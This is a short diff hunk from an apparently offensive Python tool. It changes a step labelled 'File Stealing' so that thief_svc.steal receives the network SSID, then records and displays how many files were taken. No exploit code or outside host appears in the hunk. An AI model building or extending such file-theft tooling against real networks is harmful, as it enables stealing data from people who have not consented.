@@ -246,7 +246,7 @@ def main():
                 )
 
                 # --- 6) File Stealing ---
-                stolen = thief_svc.steal(targets)
+                stolen = thief_svc.steal(targets, ssid=ssid)
                 stats["files"] = len(stolen)
                 if stats["files"] > 0:
                     display_svc.update(
